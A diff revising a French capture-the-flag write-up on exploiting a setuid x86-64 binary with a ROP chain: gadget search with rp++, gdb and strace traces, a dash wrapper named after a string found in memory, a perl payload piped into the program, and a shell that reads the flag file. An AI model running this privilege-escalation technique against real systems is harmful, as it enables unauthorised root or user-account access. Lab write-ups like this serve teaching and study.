@@ -173,10 +173,10 @@ Youpi les knackis!  Donc on a réussi à écrire dans `$rip`. On met l'adresse d
 	0x0000000000434e10 in mprotect ()
 
   
-Bien!  Est-ce qu'on peut mettre les arguments voulus dans les registres idoines, maintenant?  Je ne vois pas comment faire, arrivé à ce stade.  C'est malin, j'aurais dû y penser plus tôt.  Ca a l'air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.  
+Bien!  Est-ce qu'on peut mettre les arguments voulus dans les registres idoines, maintenant?  Comment connaître la taille du segment mémoire qu'on veut rendre exécutable?  Et depuis où?  C'est très probablement faisable, mais je suis débutant et je ne vois pas comment faire, arrivé à ce stade.  C'est malin, j'aurais dû y penser plus tôt.  Du coup ça m'a l'air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.  
   
 
-## Bon... ben ROP.
+## Bon... ben va falloir passer par du ROP.
   
 
 L'objectif est de trouver des séquences d'instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d'opérations qui feront quelque chose de particulier.  En l'occurrence, obtenir un shell avec les droits privilégiés.  
@@ -189,7 +189,7 @@ Récuperons un outil pour trouver des gadgets (c'est ainsi qu'on appelle ces sé
 	$ wget https://github.com/downloads/0vercl0k/rp/rp-lin-x64 -O /tmp/p/
 	$ chmod +x /tmp/p/rp-lin-x64
 
-On a choisi `rp++`, un peu par hasard.  Et parce que ce qu'on va faire est simple (il y en a d'autres, comme `ROPgadget`), car on veut juste `pop`-er des valeurs de la stack pour les mettre dans des registres.  Nothing fancy, comme on dit.
+On a choisi `rp++` (il y en a d'autres, comme `ROPgadget`), un peu par hasard.  C'est le premier venu quand j'ai fait une recherche sur Google et co,,e ce qu'on va faire est simple (on veut juste `pop`-er des valeurs de la stack pour les mettre dans des registres) pas la peine de passer du temps à chercher l'outil qui possède les meilleures features...
   
 On va tenter de faire exécuter un `execve()` via des gadgets, du coup.  Ce qu'on souhaite, c'est faire executer `execve("/bin/sh", NULL, NULL);`.  Notons que d'après la documentation de l'ABI du système, `$rax` doit contenir le numéro du syscall (et le contenu sera écrasé lors du retour de fonction, si jamais il se produit... dans notre cas on s'en moque, puisqu'on veut spawner un shell).  Il faudra donc mettre les registres dans l'état suivant:  
   
@@ -237,7 +237,18 @@ Maintenant, si vous avez fait attention, vous avez remarqué qu'on a zappé quel
 	$ nm -a ./ch34 | grep "/bin/sh"
 	$
 
-On ne trouve pas `"/bin/sh"` dans le binaire, ni d'autres chemins susceptible de nous plaire...  On va utiliser un trick:  trouver une petite chaîne dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à `/bin/dash` qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire `/tmp/p`, qui est dans le `PATH`.  
+On ne trouve pas `"/bin/sh"` dans le binaire, ni d'autres chemins susceptible de nous plaire...  On va utiliser un trick:  trouver une chaîne de caractère dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à `/bin/dash` qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire `/tmp/p`, qui est dans le `PATH`.  Pourquoi `/bin/dash` et pas `/bin/sh` ou `/bin/bash`?  Sur ce système, comme souvent, on a ça :
+
+	$ ls -l /bin/sh
+	lrwxrwxrwx 1 root root 4 mai   16  2015 /bin/sh -> bash
+
+Or il semble que `bash` pose problème à cause de l'option `-p` (pas référencée dans la `manpage`, juste mentionnée dans un paragraphe), qui a cet effet:
+
+> If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the  SHEL‐
+> LOPTS,  BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at invocation, the startup behavior is the
+> same, but the effective user id is not reset.
+
+Du coup, plutôt que s'embêter à gérer ce cas particulier, autant utiliser `/bin/dash` qui n'a pas ce genre de comportement.
   
 	$ readelf -x .rodata ./prog | less
 	[...]
@@ -331,9 +342,6 @@ On regarde l'état de la stack, et on observe qu'on a correctement empilé les a
 	gdb$ x/i $rip
 	=> 0x4010ec <main+142>: ret
 
-	gdb$ x/i 0x000000000044d2b4
-	   0x44d2b4 <__printf_fp+4676>: pop    rax
-
 	gdb$ x/2i 0x000000000044d2b4
 	   0x44d2b4 <__printf_fp+4676>: pop    rax
 	   0x44d2b5 <__printf_fp+4677>: ret
@@ -354,7 +362,7 @@ On regarde l'état de la stack, et on observe qu'on a correctement empilé les a
 	   0x400488 <backtrace_and_maps+183>:   syscall
 
   
-Vérifions que la chaîne est celle attendue:  
+Vérifions également que la chaîne est celle attendue:  
   
 	gdb$ x/s 0x0000000000493c00
 	0x493c00:       "Be@"
@@ -392,7 +400,7 @@ On remarque la ligne:
   
 	execve("Be@", [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
   
-On est content, on a la confirmation qu'`execve()` est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que... `"Be@"` n'est pas trouvé (`ENOENT`)!  En fait le programme regarde dans le `CWD`.  Il faut donc qu'on exécute notre programme depuis le répertoire contenant notre wrapper a `/bin/dash`:  
+On est content, on a la confirmation qu'`execve()` est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que... `"Be@"` n'est pas trouvé (`ENOENT`)!  En fait le programme regarde dans le `CWD` et ne trouve rien.  Donc `execve()` échoue et on passe à l'instruction suivante... qu'on n'a pas gérée, `$rip` contient donc une adresse arbitraire, le programme saute à cette adresse et plante lamentablement.  C'est logique, puisque nous avons fourni un chemin relatif, le système ne sait donc pas qu'il faut chercher dans `/tmp/p` et regarde juste dans le répertoire courant.  Il faut donc qu'on exécute notre programme depuis le répertoire contenant notre wrapper a `/bin/dash`:  
   
 	$ cd /tmp/p && (perl -e 'print "'$sc'"') | strace ~/prog
 	[...]
@@ -415,13 +423,8 @@ Ok, notre programme rend la main immédiatement.  Il a dû prendre un `EOF` ou u
 	ls
 	Be@  ropchain.py  rp-lin-x64
 	cd /home/user
-	ls -la
-	total 876
-	drwxr-x---  2 user-cracked user           4096 May 25  2015 .
-	drwxr-xr-x 27 root         root           4096 Sep 26 20:01 ..
-	-r--------  1 user-cracked user-cracked     23 Jun  7  2015 .passwd
-	-rwsr-x---  1 user-cracked user         877214 May 16  2015 prog
-	-rw-r-----  1 user-cracked user            383 May 24  2015 prog.c
+	ls -a
+        .passwd prog prog.c
 	cat .passwd
 	CeciEstMonFlagTagadaTsoinTsoin!
   
